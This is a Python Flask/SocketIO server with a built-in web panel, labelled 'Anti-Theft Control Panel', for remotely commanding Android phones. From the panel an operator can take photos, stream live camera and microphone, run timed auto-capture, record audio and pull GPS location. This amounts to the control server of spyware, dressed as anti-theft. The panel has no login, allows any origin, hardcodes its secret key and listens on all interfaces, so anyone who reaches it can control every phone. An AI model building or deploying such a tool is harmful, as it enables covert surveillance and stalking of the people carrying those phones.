#!/usr/bin/env python3
"""
Anti-Theft Control Panel Server
==============================
Flask + SocketIO server for controlling Android devices
Run: python server.py
"""

import os
import base64
import json
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_file
from flask_socketio import SocketIO, emit, disconnect
import eventlet

# Monkey patch for eventlet
eventlet.monkey_patch()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'antitheft-secret-key-2024'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max file size

# Initialize SocketIO with eventlet
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Store connected devices
# Format: {device_id: {'name': str, 'model': str, 'sid': str, 'online': bool, 'connected_at': timestamp}}
devices = {}

# Store captured photos
photos_gallery = []

# Store audio files
audio_files = {}

# ==================== HTML TEMPLATE ====================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anti-Theft Control Panel</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a2e;
            color: #ffffff;
            min-height: 100vh;
        }
        
        /* Header */
        .header {
            background: #16213e;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 2px solid #00ff88;
        }
        
        .header h1 {
            color: #00ff88;
            font-size: 24px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .header-icon {
            font-size: 28px;
        }
        
        .server-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff88;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Main Layout */
        .main-container {
            display: flex;
            height: calc(100vh - 80px);
        }
        
        /* Sidebar */
        .sidebar {
            width: 280px;
            background: #16213e;
            border-right: 1px solid #0f3460;
            display: flex;
            flex-direction: column;
        }
        
        .sidebar-header {
            padding: 20px;
            border-bottom: 1px solid #0f3460;
        }
        
        .sidebar-header h2 {
            font-size: 16px;
            color: #aaaaaa;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .device-count {
            font-size: 12px;
            color: #00ff88;
            margin-top: 5px;
        }
        
        .device-list {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
        }
        
        .device-item {
            background: #0f3460;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        
        .device-item:hover {
            background: #1a4a7a;
            transform: translateX(5px);
        }
        
        .device-item.active {
            border-color: #00ff88;
            background: #1a4a7a;
        }
        
        .device-item.offline {
            opacity: 0.5;
        }
        
        .device-name {
            font-weight: bold;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .device-status {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff88;
        }
        
        .device-status.offline {
            background: #ff4444;
        }
        
        .device-model {
            font-size: 12px;
            color: #888888;
            margin-top: 5px;
        }
        
        .device-rename {
            font-size: 11px;
            color: #00ff88;
            margin-top: 8px;
            cursor: pointer;
            display: inline-block;
        }
        
        .device-rename:hover {
            text-decoration: underline;
        }
        
        /* Content Area */
        .content {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
        }
        
        .no-device {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            color: #666666;
        }
        
        .no-device-icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        
        /* Control Panels */
        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 20px;
        }
        
        .control-card {
            background: #16213e;
            border-radius: 15px;
            padding: 20px;
            border: 1px solid #0f3460;
        }
        
        .control-card h3 {
            color: #00ff88;
            font-size: 16px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #0f3460;
        }
        
        .card-icon {
            font-size: 20px;
        }
        
        /* Camera Section */
        .camera-preview {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .preview-box {
            aspect-ratio: 3/4;
            background: #0f3460;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        
        .preview-box img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .preview-label {
            position: absolute;
            bottom: 5px;
            left: 5px;
            background: rgba(0,0,0,0.7);
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 11px;
        }
        
        .preview-placeholder {
            color: #666666;
            font-size: 12px;
            text-align: center;
        }
        
        /* Buttons */
        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 10px;
        }
        
        .btn {
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn-primary {
            background: #00ff88;
            color: #1a1a2e;
        }
        
        .btn-primary:hover {
            background: #00cc6a;
        }
        
        .btn-danger {
            background: #ff4444;
            color: white;
        }
        
        .btn-danger:hover {
            background: #cc3333;
        }
        
        .btn-warning {
            background: #ffaa00;
            color: #1a1a2e;
        }
        
        .btn-warning:hover {
            background: #cc8800;
        }
        
        .btn-secondary {
            background: #0f3460;
            color: white;
            border: 1px solid #1a4a7a;
        }
        
        .btn-secondary:hover {
            background: #1a4a7a;
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        /* Input Groups */
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
            align-items: center;
        }
        
        .input-group label {
            font-size: 13px;
            color: #aaaaaa;
            min-width: 80px;
        }
        
        .input-field {
            flex: 1;
            padding: 10px 14px;
            background: #0f3460;
            border: 1px solid #1a4a7a;
            border-radius: 8px;
            color: white;
            font-size: 13px;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #00ff88;
        }
        
        /* Slider */
        .slider-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .slider {
            flex: 1;
            -webkit-appearance: none;
            height: 6px;
            background: #0f3460;
            border-radius: 3px;
            outline: none;
        }
        
        .slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 18px;
            height: 18px;
            background: #00ff88;
            border-radius: 50%;
            cursor: pointer;
        }
        
        .slider-value {
            min-width: 50px;
            text-align: center;
            font-size: 13px;
            color: #00ff88;
        }
        
        /* Location Display */
        .location-info {
            background: #0f3460;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 15px;
        }
        
        .location-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #1a4a7a;
        }
        
        .location-row:last-child {
            border-bottom: none;
        }
        
        .location-label {
            color: #888888;
            font-size: 13px;
        }
        
        .location-value {
            color: #00ff88;
            font-family: monospace;
            font-size: 13px;
        }
        
        /* Gallery */
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 10px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .gallery-item {
            aspect-ratio: 1;
            background: #0f3460;
            border-radius: 8px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        
        .gallery-item:hover {
            transform: scale(1.05);
        }
        
        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            max-width: 90%;
            max-height: 90%;
        }
        
        .modal-content img {
            max-width: 100%;
            max-height: 80vh;
            border-radius: 10px;
        }
        
        .modal-close {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 30px;
            color: white;
            cursor: pointer;
            background: #ff4444;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        /* Audio Player */
        .audio-player {
            width: 100%;
            margin-top: 10px;
        }
        
        /* Toast Notifications */
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1001;
        }
        
        .toast {
            background: #16213e;
            border-left: 4px solid #00ff88;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 10px;
            animation: slideIn 0.3s ease;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            max-width: 300px;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        .toast.error {
            border-left-color: #ff4444;
        }
        
        .toast.warning {
            border-left-color: #ffaa00;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .main-container {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                max-height: 200px;
            }
            
            .control-grid {
                grid-template-columns: 1fr;
            }
            
            .camera-preview {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <h1>
            <span class="header-icon">🛡️</span>
            Anti-Theft Control Panel
        </h1>
        <div class="server-status">
            <span class="status-dot"></span>
            <span>Server Online</span>
        </div>
    </div>
    
    <!-- Main Container -->
    <div class="main-container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-header">
                <h2>Connected Devices</h2>
                <div class="device-count"><span id="deviceCount">0</span> devices</div>
            </div>
            <div class="device-list" id="deviceList">
                <!-- Devices will be added here -->
            </div>
        </div>
        
        <!-- Content -->
        <div class="content" id="contentArea">
            <div class="no-device">
                <div class="no-device-icon">📱</div>
                <h2>No Device Selected</h2>
                <p>Select a device from the sidebar to start controlling</p>
            </div>
        </div>
    </div>
    
    <!-- Image Modal -->
    <div class="modal" id="imageModal">
        <span class="modal-close" onclick="closeModal()">&times;</span>
        <div class="modal-content">
            <img id="modalImage" src="" alt="Full size">
        </div>
    </div>
    
    <!-- Toast Container -->
    <div class="toast-container" id="toastContainer"></div>
    
    <script>
        // Global variables
        let socket;
        let devices = {};
        let selectedDevice = null;
        let isLiveCamera = false;
        let isLiveMic = false;
        let galleryPhotos = [];
        
        // Initialize Socket.IO
        function initSocket() {
            socket = io();
            
            socket.on('connect', () => {
                showToast('Connected to server', 'success');
            });
            
            socket.on('disconnect', () => {
                showToast('Disconnected from server', 'error');
            });
            
            socket.on('devices_update', (data) => {
                devices = data.devices;
                updateDeviceList();
            });
            
            socket.on('device_response', (data) => {
                handleDeviceResponse(data);
            });
        }
        
        // Update device list in sidebar
        function updateDeviceList() {
            const deviceList = document.getElementById('deviceList');
            const deviceCount = document.getElementById('deviceCount');
            
            deviceCount.textContent = Object.keys(devices).length;
            deviceList.innerHTML = '';
            
            for (const [id, device] of Object.entries(devices)) {
                const item = document.createElement('div');
                item.className = `device-item ${id === selectedDevice ? 'active' : ''} ${!device.online ? 'offline' : ''}`;
                item.onclick = () => selectDevice(id);
                
                item.innerHTML = `
                    <div class="device-name">
                        <span class="device-status ${!device.online ? 'offline' : ''}"></span>
                        ${escapeHtml(device.name)}
                    </div>
                    <div class="device-model">${escapeHtml(device.model)}</div>
                    <span class="device-rename" onclick="event.stopPropagation(); renameDevice('${id}')">✏️ Rename</span>
                `;
                
                deviceList.appendChild(item);
            }
        }
        
        // Select a device
        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            updateDeviceList();
            showControlPanel();
        }
        
        // Show control panel for selected device
        function showControlPanel() {
            const device = devices[selectedDevice];
            if (!device) return;
            
            const contentArea = document.getElementById('contentArea');
            contentArea.innerHTML = `
                <div class="control-grid">
                    <!-- Camera Section -->
                    <div class="control-card">
                        <h3><span class="card-icon">📷</span> Camera Control</h3>
                        <div class="camera-preview">
                            <div class="preview-box" id="frontPreview">
                                <div class="preview-placeholder">Front Camera</div>
                            </div>
                            <div class="preview-box" id="backPreview">
                                <div class="preview-placeholder">Back Camera</div>
                            </div>
                        </div>
                        <div class="btn-group">
                            <button class="btn btn-primary" onclick="takePhoto('front')">📸 Front Photo</button>
                            <button class="btn btn-primary" onclick="takePhoto('back')">📸 Back Photo</button>
                        </div>
                        <div class="btn-group">
                            <button class="btn btn-secondary" onclick="startLiveCamera('front')">▶️ Live Front</button>
                            <button class="btn btn-secondary" onclick="startLiveCamera('back')">▶️ Live Back</button>
                            <button class="btn btn-danger" onclick="stopLiveCamera()">⏹️ Stop</button>
                        </div>
                        <div class="input-group">
                            <label>Interval (sec):</label>
                            <input type="number" class="input-field" id="autoCaptureInterval" value="5" min="1" max="60">
                            <button class="btn btn-warning" onclick="startAutoCapture()">▶️ Auto</button>
                            <button class="btn btn-danger" onclick="stopAutoCapture()">⏹️ Stop</button>
                        </div>
                    </div>
                    
                    <!-- Audio Section -->
                    <div class="control-card">
                        <h3><span class="card-icon">🎤</span> Audio Control</h3>
                        <div class="btn-group">
                            <button class="btn btn-primary" onclick="recordAudio()">🎙️ Record 10s</button>
                            <button class="btn ${isLiveMic ? 'btn-danger' : 'btn-secondary'}" onclick="toggleLiveMic()">
                                ${isLiveMic ? '⏹️ Stop Mic' : '📡 Live Mic'}
                            </button>
                        </div>
                        <div class="input-group">
                            <label>Speak:</label>
                            <input type="text" class="input-field" id="ttsText" placeholder="Enter text to speak...">
                            <button class="btn btn-primary" onclick="speakText()">🔊 Speak</button>
                        </div>
                        <div class="input-group">
                            <label>Audio:</label>
                            <input type="file" class="input-field" id="audioFile" accept="audio/*">
                            <button class="btn btn-secondary" onclick="playAudioFile()">▶️ Play</button>
                        </div>
                        <audio id="audioPlayer" class="audio-player" controls style="display:none;"></audio>
                    </div>
                    
                    <!-- Flashlight Section -->
                    <div class="control-card">
                        <h3><span class="card-icon">🔦</span> Flashlight Control</h3>
                        <div class="btn-group">
                            <button class="btn btn-primary" onclick="flashOn()">💡 ON</button>
                            <button class="btn btn-danger" onclick="flashOff()">🌑 OFF</button>
                            <button class="btn btn-warning" onclick="flashBlink()">✨ Blink</button>
                        </div>
                        <div class="slider-container">
                            <label>Blink Speed:</label>
                            <input type="range" class="slider" id="blinkSpeed" min="100" max="1000" value="500">
                            <span class="slider-value" id="blinkSpeedValue">500ms</span>
                        </div>
                        <button class="btn btn-danger" onclick="stopFlashBlink()">⏹️ Stop Blink</button>
                    </div>
                    
                    <!-- Location Section -->
                    <div class="control-card">
                        <h3><span class="card-icon">📍</span> Location</h3>
                        <div class="location-info">
                            <div class="location-row">
                                <span class="location-label">Latitude:</span>
                                <span class="location-value" id="latValue">--</span>
                            </div>
                            <div class="location-row">
                                <span class="location-label">Longitude:</span>
                                <span class="location-value" id="lngValue">--</span>
                            </div>
                            <div class="location-row">
                                <span class="location-label">Accuracy:</span>
                                <span class="location-value" id="accValue">--</span>
                            </div>
                        </div>
                        <div class="btn-group">
                            <button class="btn btn-primary" onclick="getLocation()">📍 Get Location</button>
                            <button class="btn btn-secondary" onclick="openInMaps()">🗺️ Open Maps</button>
                        </div>
                    </div>
                    
                    <!-- Gallery Section -->
                    <div class="control-card" style="grid-column: 1 / -1;">
                        <h3><span class="card-icon">🖼️</span> Photo Gallery</h3>
                        <div class="gallery-grid" id="galleryGrid">
                            <!-- Photos will be added here -->
                        </div>
                    </div>
                </div>
            `;
            
            // Update slider value display
            const slider = document.getElementById('blinkSpeed');
            if (slider) {
                slider.oninput = function() {
                    document.getElementById('blinkSpeedValue').textContent = this.value + 'ms';
                };
            }
            
            updateGallery();
        }
        
        // Send command to device
        function sendCommand(type, data = {}) {
            if (!selectedDevice) {
                showToast('No device selected', 'error');
                return;
            }
            
            if (!devices[selectedDevice]?.online) {
                showToast('Device is offline', 'error');
                return;
            }
            
            socket.emit('send_command', {
                device_id: selectedDevice,
                type: type,
                data: data
            });
            
            showToast(`Command sent: ${type}`, 'success');
        }
        
        // Camera commands
        function takePhoto(camera) {
            sendCommand('take_photo', { camera: camera });
        }
        
        function startLiveCamera(camera) {
            isLiveCamera = true;
            sendCommand('start_live_camera', { camera: camera });
        }
        
        function stopLiveCamera() {
            isLiveCamera = false;
            sendCommand('stop_live_camera');
        }
        
        function startAutoCapture() {
            const interval = document.getElementById('autoCaptureInterval').value;
            sendCommand('start_auto_capture', { interval: parseInt(interval), camera: 'back' });
        }
        
        function stopAutoCapture() {
            sendCommand('stop_auto_capture');
        }
        
        // Audio commands
        function recordAudio() {
            sendCommand('record_audio', { duration: 10 });
        }
        
        function toggleLiveMic() {
            isLiveMic = !isLiveMic;
            if (isLiveMic) {
                sendCommand('start_live_mic');
            } else {
                sendCommand('stop_live_mic');
            }
            showControlPanel(); // Refresh UI
        }
        
        function speakText() {
            const text = document.getElementById('ttsText').value;
            if (text) {
                sendCommand('tts', { text: text });
            }
        }
        
        function playAudioFile() {
            const fileInput = document.getElementById('audioFile');
            if (fileInput.files.length > 0) {
                const file = fileInput.files[0];
                const reader = new FileReader();
                reader.onload = function(e) {
                    const base64 = e.target.result.split(',')[1];
                    sendCommand('play_audio', { audio_data: `data:${file.type};base64,${base64}` });
                };
                reader.readAsDataURL(file);
            }
        }
        
        // Flashlight commands
        function flashOn() {
            sendCommand('flash_on');
        }
        
        function flashOff() {
            sendCommand('flash_off');
        }
        
        function flashBlink() {
            const speed = document.getElementById('blinkSpeed').value;
            sendCommand('flash_blink', { speed: parseInt(speed) });
        }
        
        function stopFlashBlink() {
            sendCommand('stop_flash_blink');
        }
        
        // Location commands
        function getLocation() {
            sendCommand('get_location');
        }
        
        let lastLocation = null;
        
        function openInMaps() {
            if (lastLocation) {
                window.open(`https://www.google.com/maps?q=${lastLocation.latitude},${lastLocation.longitude}`, '_blank');
            } else {
                showToast('No location data available', 'error');
            }
        }
        
        // Rename device
        function renameDevice(deviceId) {
            const newName = prompt('Enter new device name:', devices[deviceId].name);
            if (newName) {
                fetch(`/rename/${deviceId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name: newName })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showToast('Device renamed', 'success');
                    }
                });
            }
        }
        
        // Handle device responses
        function handleDeviceResponse(data) {
            if (data.device_id !== selectedDevice) return;
            
            switch (data.type) {
                case 'photo':
                case 'live_frame':
                    const camera = data.data.camera;
                    const previewId = camera === 'front' ? 'frontPreview' : 'backPreview';
                    const preview = document.getElementById(previewId);
                    if (preview) {
                        preview.innerHTML = `<img src="${data.data.image_data}" alt="${camera} camera">`;
                    }
                    
                    if (data.type === 'photo') {
                        galleryPhotos.unshift({
                            src: data.data.image_data,
                            timestamp: data.data.timestamp,
                            camera: camera
                        });
                        updateGallery();
                    }
                    break;
                    
                case 'audio':
                    const audioPlayer = document.getElementById('audioPlayer');
                    if (audioPlayer) {
                        audioPlayer.src = data.data.audio_data;
                        audioPlayer.style.display = 'block';
                        audioPlayer.play();
                    }
                    break;
                    
                case 'location':
                    lastLocation = data.data;
                    document.getElementById('latValue').textContent = data.data.latitude.toFixed(6);
                    document.getElementById('lngValue').textContent = data.data.longitude.toFixed(6);
                    document.getElementById('accValue').textContent = data.data.accuracy.toFixed(1) + 'm';
                    break;
                    
                case 'error':
                    showToast(data.data.message, 'error');
                    break;
                    
                default:
                    showToast(`Received: ${data.type}`, 'success');
            }
        }
        
        // Update gallery
        function updateGallery() {
            const galleryGrid = document.getElementById('galleryGrid');
            if (!galleryGrid) return;
            
            galleryGrid.innerHTML = galleryPhotos.map((photo, index) => `
                <div class="gallery-item" onclick="openImageModal('${photo.src}')">
                    <img src="${photo.src}" alt="Captured photo">
                </div>
            `).join('');
        }
        
        // Modal functions
        function openImageModal(src) {
            const modal = document.getElementById('imageModal');
            const img = document.getElementById('modalImage');
            img.src = src;
            modal.classList.add('active');
        }
        
        function closeModal() {
            document.getElementById('imageModal').classList.remove('active');
        }
        
        // Toast notifications
        function showToast(message, type = 'success') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            container.appendChild(toast);
            
            setTimeout(() => {
                toast.remove();
            }, 3000);
        }
        
        // Escape HTML
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', initSocket);
    </script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Serve the main web UI"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/devices')
def get_devices():
    """Get list of connected devices"""
    return jsonify({'devices': devices})

@app.route('/rename/<device_id>', methods=['POST'])
def rename_device(device_id):
    """Rename a device"""
    data = request.get_json()
    if device_id in devices and 'name' in data:
        devices[device_id]['name'] = data['name']
        socketio.emit('devices_update', {'devices': devices})
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Device not found'})

# ==================== SOCKET.IO EVENTS ====================

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    print(f'[+] Web client connected: {request.sid}')
    emit('devices_update', {'devices': devices})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    print(f'[-] Client disconnected: {request.sid}')
    
    # Check if it's a device
    for device_id, device in list(devices.items()):
        if device.get('sid') == request.sid:
            devices[device_id]['online'] = False
            print(f'[!] Device {device_id} went offline')
            socketio.emit('devices_update', {'devices': devices})
            break

@socketio.on('register_device')
def handle_register_device(data):
    """Handle device registration"""
    device_id = data.get('device_id')
    if device_id:
        devices[device_id] = {
            'name': data.get('name', 'Unknown Device'),
            'model': data.get('model', 'Unknown Model'),
            'manufacturer': data.get('manufacturer', 'Unknown'),
            'android_version': data.get('android_version', 'Unknown'),
            'sid': request.sid,
            'online': True,
            'connected_at': datetime.now().isoformat()
        }
        print(f'[+] Device registered: {data.get("name")} ({device_id})')
        socketio.emit('devices_update', {'devices': devices})
        emit('registered', {'success': True})

@socketio.on('send_command')
def handle_send_command(data):
    """Forward command to target device"""
    device_id = data.get('device_id')
    command_type = data.get('type')
    command_data = data.get('data', {})
    
    if device_id in devices:
        target_sid = devices[device_id].get('sid')
        if target_sid:
            socketio.emit('command', {
                'type': command_type,
                'data': command_data
            }, room=target_sid)
            print(f'[>] Command "{command_type}" sent to {device_id}')
        else:
            emit('error', {'message': 'Device not connected'})
    else:
        emit('error', {'message': 'Device not found'})

@socketio.on('device_response')
def handle_device_response(data):
    """Handle response from device"""
    device_id = data.get('device_id')
    response_type = data.get('type')
    
    print(f'[<] Response "{response_type}" from {device_id}')
    
    # Store photos in gallery
    if response_type == 'photo':
        photo_data = {
            'device_id': device_id,
            'image_data': data.get('data', {}).get('image_data'),
            'camera': data.get('data', {}).get('camera'),
            'timestamp': data.get('data', {}).get('timestamp')
        }
        photos_gallery.append(photo_data)
    
    # Broadcast to all web clients
    socketio.emit('device_response', data)

# ==================== MAIN ====================

if __name__ == '__main__':
    print("=" * 60)
    print("   Anti-Theft Control Panel Server")
    print("=" * 60)
    print("\n[+] Starting server...")
    print("[+] Access the control panel at:")
    print("    - Local:   http://localhost:5000")
    print("    - Network: http://0.0.0.0:5000")
    print("\n[!] Press Ctrl+C to stop the server")
    print("=" * 60 + "\n")
    
    # Run the server
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
